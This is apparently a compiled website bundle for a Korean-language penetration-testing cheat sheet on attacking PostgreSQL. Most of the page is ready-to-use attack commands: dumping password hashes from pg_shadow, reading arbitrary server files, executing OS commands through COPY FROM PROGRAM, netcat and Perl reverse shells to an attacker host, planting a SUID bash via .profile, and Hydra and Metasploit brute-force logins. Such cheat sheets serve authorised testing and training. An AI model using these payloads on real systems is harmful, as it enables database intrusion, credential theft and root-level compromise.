"use strict";(self.webpackChunkmy_docusaurus_website=self.webpackChunkmy_docusaurus_website||[]).push([[5612],{1521:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>c,contentTitle:()=>a,default:()=>p,frontMatter:()=>i,metadata:()=>r,toc:()=>d});const r=JSON.parse('{"id":"cheatsheet/services/postgresql","title":"PostgreSQL - 5432","description":"\uae30\ubcf8 \uc815\ubcf4","source":"@site/docs/cheatsheet/services/postgresql.md","sourceDirName":"cheatsheet/services","slug":"/cheatsheet/services/postgresql","permalink":"/my-docusaurus-page/cheatsheet/services/postgresql","draft":false,"unlisted":false,"tags":[],"version":"current","sidebarPosition":11,"frontMatter":{"sidebar_position":11},"sidebar":"tutorialSidebar","previous":{"title":"RDP - 3389","permalink":"/my-docusaurus-page/cheatsheet/services/rdp"},"next":{"title":"Redis - 6379","permalink":"/my-docusaurus-page/cheatsheet/services/redis"}}');var t=n(4848),l=n(8453);const i={sidebar_position:11},a="PostgreSQL - 5432",c={},d=[{value:"\uae30\ubcf8 \uc815\ubcf4",id:"\uae30\ubcf8-\uc815\ubcf4",level:2},{value:"\uc5f0\uacb0",id:"\uc5f0\uacb0",level:2},{value:"\uae30\ubcf8 \uba85\ub839\uc5b4",id:"\uae30\ubcf8-\uba85\ub839\uc5b4",level:2},{value:"\ud30c\uc77c \uc2dc\uc2a4\ud15c \uc811\uadfc",id:"\ud30c\uc77c-\uc2dc\uc2a4\ud15c-\uc811\uadfc",level:2},{value:"\uc6d0\uaca9 \ucf54\ub4dc \uc2e4\ud589 (RCE)",id:"\uc6d0\uaca9-\ucf54\ub4dc-\uc2e4\ud589-rce",level:2},{value:"\ubc29\ubc95 1: COPY FROM PROGRAM",id:"\ubc29\ubc95-1-copy-from-program",level:3},{value:"\ubc29\ubc95 2: COPY TO PROGRAM (\ub9ac\ubc84\uc2a4 \uc258)",id:"\ubc29\ubc95-2-copy-to-program-\ub9ac\ubc84\uc2a4-\uc258",level:3},{value:"\ubc29\ubc95 3: SUID \ubc14\uc774\ub108\ub9ac \uc0dd\uc131",id:"\ubc29\ubc95-3-suid-\ubc14\uc774\ub108\ub9ac-\uc0dd\uc131",level:3},{value:"Nmap",id:"nmap",level:2},{value:"Hydra \ube0c\ub8e8\ud2b8\ud3ec\uc2a4",id:"hydra-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",level:2},{value:"metasploit",id:"metasploit",level:2},{value:"\ucc38\uace0",id:"\ucc38\uace0",level:2}];function o(e){const s={code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",p:"p",pre:"pre",strong:"strong",ul:"ul",...(0,l.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(s.header,{children:(0,t.jsx)(s.h1,{id:"postgresql---5432",children:"PostgreSQL - 5432"})}),"\n",(0,t.jsx)(s.h2,{id:"\uae30\ubcf8-\uc815\ubcf4",children:"\uae30\ubcf8 \uc815\ubcf4"}),"\n",(0,t.jsxs)(s.p,{children:[(0,t.jsx)(s.strong,{children:"\ud3ec\ud2b8"}),": 5432"]}),"\n",(0,t.jsx)(s.p,{children:"PostgreSQL\uc740 \uc624\ud508\uc18c\uc2a4 \uac1d\uccb4-\uad00\uacc4\ud615 \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uad00\ub9ac \uc2dc\uc2a4\ud15c\uc785\ub2c8\ub2e4."}),"\n",(0,t.jsx)(s.h2,{id:"\uc5f0\uacb0",children:"\uc5f0\uacb0"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:'# \ub85c\uceec \uc5f0\uacb0\npsql\n\n# \uc6d0\uaca9 \uc5f0\uacb0\npsql -h <RHOST> -p 5432 -U <USERNAME> -d <DATABASE>\n\n# \uba85\ub839 \uc2e4\ud589\npsql -h <LHOST> -U <USERNAME> -c "<COMMAND>;"\n'})}),"\n",(0,t.jsx)(s.h2,{id:"\uae30\ubcf8-\uba85\ub839\uc5b4",children:"\uae30\ubcf8 \uba85\ub839\uc5b4"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"-- \ub370\uc774\ud130\ubca0\uc774\uc2a4 \ubaa9\ub85d\npostgres=# \\list\n\n-- \ub370\uc774\ud130\ubca0\uc774\uc2a4 \uc0ac\uc6a9\npostgres=# \\c\npostgres=# \\c <DATABASE>\n\n-- \uba85\ub839 \ud788\uc2a4\ud1a0\ub9ac\npostgres=# \\s\n\n-- \uc885\ub8cc\npostgres=# \\q\n\n-- \ud14c\uc774\ube14 \ubaa9\ub85d (\ud604\uc7ac \uc2a4\ud0a4\ub9c8)\n<DATABASE>=# \\dt\n\n-- \ud14c\uc774\ube14 \ubaa9\ub85d (\ubaa8\ub4e0 \uc2a4\ud0a4\ub9c8)\n<DATABASE>=# \\dt *.*\n\n-- \uc0ac\uc6a9\uc790/\uc5ed\ud560 \ubaa9\ub85d\n<DATABASE>=# \\du\n<DATABASE>=# \\du+\n\n-- \ud604\uc7ac \uc0ac\uc6a9\uc790\n<DATABASE>=# SELECT user;\n\n-- \ud14c\uc774\ube14 \ub0b4\uc6a9 \uc870\ud68c\n<DATABASE>=# TABLE <TABLE>;\n\n-- \uc790\uaca9\uc99d\uba85 \uc77d\uae30\n<DATABASE>=# SELECT usename, passwd from pg_shadow;\n"})}),"\n",(0,t.jsx)(s.h2,{id:"\ud30c\uc77c-\uc2dc\uc2a4\ud15c-\uc811\uadfc",children:"\ud30c\uc77c \uc2dc\uc2a4\ud15c \uc811\uadfc"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"-- \ub514\ub809\ud1a0\ub9ac \uc77d\uae30\n<DATABASE>=# SELECT * FROM pg_ls_dir('/'); --\n\n-- \ud30c\uc77c \uc77d\uae30\n<DATABASE>=# SELECT pg_read_file('/PATH/TO/FILE/<FILE>', 0, 1000000); --\n"})}),"\n",(0,t.jsx)(s.h2,{id:"\uc6d0\uaca9-\ucf54\ub4dc-\uc2e4\ud589-rce",children:"\uc6d0\uaca9 \ucf54\ub4dc \uc2e4\ud589 (RCE)"}),"\n",(0,t.jsx)(s.h3,{id:"\ubc29\ubc95-1-copy-from-program",children:"\ubc29\ubc95 1: COPY FROM PROGRAM"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"-- \ud14c\uc774\ube14 \uc0dd\uc131 \ubc0f \uba85\ub839 \uc2e4\ud589\n<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;\n<DATABASE>=# CREATE TABLE cmd_exec(cmd_output text);\n<DATABASE>=# COPY cmd_exec FROM PROGRAM 'id';\n<DATABASE>=# SELECT * FROM cmd_exec;\n<DATABASE>=# DROP TABLE IF EXISTS cmd_exec;\n"})}),"\n",(0,t.jsx)(s.h3,{id:"\ubc29\ubc95-2-copy-to-program-\ub9ac\ubc84\uc2a4-\uc258",children:"\ubc29\ubc95 2: COPY TO PROGRAM (\ub9ac\ubc84\uc2a4 \uc258)"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"-- Netcat \ub9ac\ubc84\uc2a4 \uc258\n<DATABASE>=# COPY (SELECT pg_backend_pid()) TO PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <LHOST> <LPORT> >/tmp/f';\n\n-- Perl \ub9ac\ubc84\uc2a4 \uc258\n<DATABASE>=# COPY files FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"<LHOST>:<LPORT>\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';\n"})}),"\n",(0,t.jsx)(s.h3,{id:"\ubc29\ubc95-3-suid-\ubc14\uc774\ub108\ub9ac-\uc0dd\uc131",children:"\ubc29\ubc95 3: SUID \ubc14\uc774\ub108\ub9ac \uc0dd\uc131"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-sql",children:"-- .profile\uc5d0 SUID bash \uc0dd\uc131 \uba85\ub839 \uc791\uc131\n<DATABASE>=# COPY (SELECT CAST('cp /bin/bash /var/lib/postgresql/bash;chmod 4777 /var/lib/postgresql/bash;' AS text)) TO '/var/lib/postgresql/.profile';\n"})}),"\n",(0,t.jsx)(s.h2,{id:"nmap",children:"Nmap"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"# PostgreSQL \ubc84\uc804 \ud655\uc778\nsudo nmap -p5432 -sV <RHOST>\n\n# PostgreSQL \uc815\ubcf4 \uc218\uc9d1\nsudo nmap -p5432 --script pgsql-brute <RHOST>\n"})}),"\n",(0,t.jsx)(s.h2,{id:"hydra-\ube0c\ub8e8\ud2b8\ud3ec\uc2a4",children:"Hydra \ube0c\ub8e8\ud2b8\ud3ec\uc2a4"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"# PostgreSQL \ube0c\ub8e8\ud2b8\ud3ec\uc2a4\nhydra -L users.txt -P passwords.txt <RHOST> postgres\nhydra -l postgres -P passwords.txt <RHOST> postgres\n"})}),"\n",(0,t.jsx)(s.h2,{id:"metasploit",children:"metasploit"}),"\n",(0,t.jsx)(s.pre,{children:(0,t.jsx)(s.code,{className:"language-bash",children:"# PostgreSQL \ub85c\uadf8\uc778\nuse auxiliary/scanner/postgres/postgres_login\nset RHOSTS <RHOST>\nset USERNAME postgres\nset PASSWORD postgres\nrun\n\n# PostgreSQL \ubc84\uc804 \ud655\uc778\nuse auxiliary/scanner/postgres/postgres_version\nset RHOSTS <RHOST>\nrun\n\n# PostgreSQL \uc5f4\uac70\nuse auxiliary/admin/postgres/postgres_sql\nset RHOSTS <RHOST>\nset USERNAME postgres\nset PASSWORD <PASSWORD>\nset SQL SELECT version()\nrun\n"})}),"\n",(0,t.jsx)(s.h2,{id:"\ucc38\uace0",children:"\ucc38\uace0"}),"\n",(0,t.jsxs)(s.ul,{children:["\n",(0,t.jsx)(s.li,{children:"COPY FROM/TO PROGRAM \uad8c\ud55c \ud655\uc778"}),"\n",(0,t.jsx)(s.li,{children:"Superuser \uad8c\ud55c \ud655\uc778"}),"\n",(0,t.jsx)(s.li,{children:"pg_read_file, pg_ls_dir \ud568\uc218 \uc0ac\uc6a9 \uac00\ub2a5 \uc5ec\ubd80"}),"\n",(0,t.jsx)(s.li,{children:"\uc57d\ud55c \uc790\uaca9\uc99d\uba85 \ud14c\uc2a4\ud2b8 (postgres/postgres)"}),"\n",(0,t.jsx)(s.li,{children:"/var/lib/postgresql/.profile \uc545\uc6a9"}),"\n"]})]})}function p(e={}){const{wrapper:s}={...(0,l.R)(),...e.components};return s?(0,t.jsx)(s,{...e,children:(0,t.jsx)(o,{...e})}):o(e)}},8453:(e,s,n)=>{n.d(s,{R:()=>i,x:()=>a});var r=n(6540);const t={},l=r.createContext(t);function i(e){const s=r.useContext(l);return r.useMemo(function(){return"function"==typeof e?e(s):{...s,...e}},[s,e])}function a(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:i(e.components),r.createElement(l.Provider,{value:s},e.children)}}}]);